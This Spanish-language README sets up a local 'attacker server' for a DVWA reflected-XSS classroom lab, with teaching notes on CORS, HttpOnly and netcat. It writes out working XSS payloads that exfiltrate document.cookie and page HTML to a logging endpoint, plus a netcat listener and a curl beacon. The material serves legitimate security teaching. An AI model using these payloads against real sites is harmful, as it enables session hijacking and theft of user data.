# Servidor de atacante para el laboratorio XSS (DVWA)

Receptor mínimo (2 archivos PHP) que simula el "sistema del atacante" al que
el payload de exfiltración envía los datos de la víctima. Pensado para el
Ejercicio A.1 de `LabXSS.md` (paso 3 — *Exfiltración de Sesión*).

> **Uso educativo y local solamente.** No lo expongas en Internet ni lo uses
> contra sistemas que no te pertenezcan.

## Requisitos

- PHP 8.x con el servidor embebido (`php -S ...`), sin framework ni base de datos.
- DVWA y este servidor corriendo en la misma máquina (o al menos accesibles
  desde el navegador de la víctima).

## Arranque

Desde esta carpeta:

```bash
php -S 0.0.0.0:8082
```

> **Sobre el puerto:** el ejemplo usa el **8082** porque cualquier puerto menor
> que 1024 (p. ej. el 82) es *privilegiado* y el servidor PHP necesita arrancar
> como root (`sudo php -S 0.0.0.0:82`), lo cual no conviene en el aula. Con un
> puerto ≥ 1024 no hace falta ningún privilegio. Si se usa otro (p. ej. 8080),
> reemplazar `8082` por ese número en todos los lugares donde aparezca.

Comprobación rápida desde una terminal:

```bash
curl 'http://localhost:8082/log.php?prueba=hola'
curl http://localhost:8082/ver.php
```

`ver.php` muestra lo capturado (una línea JSON por petición: hora, IP de la
víctima, parámetros recibidos, user-agent y referer).

## Payload para DVWA (Ejercicio A.1, paso 3)


En el módulo *XSS (Reflected)*, nivel **Low**, ingresar:

```html
<script>new Image().src='http://localhost:8082/log.php?cookie=' + encodeURIComponent(document.cookie);</script>
```

Alternativa: la guía usa `escape(document.cookie)`; `encodeURIComponent` es el
equivalente moderno y recomendado ( `escape` está deprecado).

Al hacer clic en *Submit*, el navegador de la "víctima" dispara una petición
de imagen hacia `log.php` con la cookie en la query. Abrir
`http://localhost:8082/ver.php` para ver la cookie capturada.

Variante útil para mostrar exfiltración de contenido (no solo cookies):

```html
<script>new Image().src='http://localhost:8082/log.php?html=' + encodeURIComponent(document.documentElement.outerHTML.slice(0, 1500));</script>
```

(Recordar el límite de longitud de una URL: ~2000 caracteres son seguros;
para volcados grandes haría falta un POST, que escapa a este ejemplo mínimo.)

## Notas para la explicación en clase

- **Cross-origin pero permitido**: DVWA (puerto 80) y el atacante (puerto 8082)
  son orígenes distintos, pero el navegador deja pasar la petición simple de
  la imagen — el atacante solo *recibe* datos, no *lee* respuestas, por eso
  no interviene CORS. El header `Access-Control-Allow-Origin: *` de `log.php`
  está por si se prueba una variante con `fetch`.
- **Mixed content**: si DVWA se sirviera por HTTPS y el logger por HTTP, el
  navegador bloquearía la carga. En el laboratorio todo por HTTP no hay
  problema.
- **Cookie HttpOnly**: si `document.cookie` viene vacío, la cookie de sesión
  tiene el flag `HttpOnly` y el JavaScript no puede leerla — es una defensa
  real y un buen momento para conversarla.
- **Si DVWA está en otra máquina** (p. ej. contenedor o VM) y la víctima
  navega desde otro equipo, usar la IP del host del logger:
  `http://192.168.x.x:8082/log.php?...`.
- **Sin PHP**: si no hay PHP disponible (o para una comprobación exprés de que
  "algo llega"), basta con netcat. Ver la sección siguiente.

## Alternativa sin PHP: netcat

Para ver que el payload dispara, sin escribir código, netcat (`nc`) sirve de
"servidor" oyente que imprime en la terminal el tráfico crudo que recibe:

```bash
nc -lk 8082
```

- `-l` (*listen*): queda **escuchando** entrantes en el puerto 8082 en lugar
  de conectarse a otro equipo.
- `-k` (*keep*): **sigue escuchando después de la primera conexión**. Sin
  `-k`, netcat clásico atiende un solo cliente y termina; con `-k` aguanta
  varias conexiones seguidas (varios alumnos, varios intentos).

### Qué se ve en la terminal

Disparando un beacon simulado
(`curl 'http://localhost:8082/log.php?cookie=PHPSESSID%3Ddemo123'`),
netcat imprime **tal cual** lo que viajó por la red:

```
GET /log.php?cookie=PHPSESSID%3Ddemo123 HTTP/1.1
Host: 127.0.0.1:8082
User-Agent: curl/8.5.0
Accept: */*
```

Ahí está el "momento aha" de la demostración: la cookie aparece **en texto
plano dentro de la request-line** (la primera línea). La exfiltración no es
magia, es simplemente una petición HTTP con los datos robados colgados de la
query string.

### Avisar antes en clase: el cliente queda colgado

Netcat solo **escucha e imprime**, no genera ninguna respuesta HTTP, así que
el navegador o `curl` quedan esperando hasta que se corte con **Ctrl+C**. Es
esperable, no es un error. A diferencia de `log.php`, que sí responde con un
GIF de 1×1 para no dejar colgada a la víctima.

### Variantes de netcat

Existen tres familias y no todos los `-k` funcionan igual:

| Variante | Dónde se encuentra | `-k` |
|----------|--------------------|------|
| OpenBSD `nc` | Ubuntu / Debian | soportado |
| GNU netcat (`netcat-traditional`) | Debian (legacy) | a veces no existe; usar `-q 1` |
| `ncat` | Nmap (reemplazo moderno) | soportado |

### Limitaciones frente a `log.php`

- **No persiste**: lo capturado vive en la terminal; al cerrarla se pierde.
  `log.php` deja `registro.log` revisable después de la clase.
- **Sin estructura**: imprime el crudo, sin separar hora / IP / user-agent
  en campos ordenados.
- **No responde**, como se explicó arriba.

Por eso netcat es el **plan B** o la comprobación rápida, y `log.php` +
`ver.php` es lo que queda como material del aula.

## Archivos

| Archivo      | Función                                                 |
|--------------|---------------------------------------------------------|
| `log.php`    | Registra los parámetros recibidos en `registro.log`     |
| `ver.php`    | Muestra `registro.log` en texto plano                   |
| `registro.log` | Se crea solo al recibir la primera petición           |
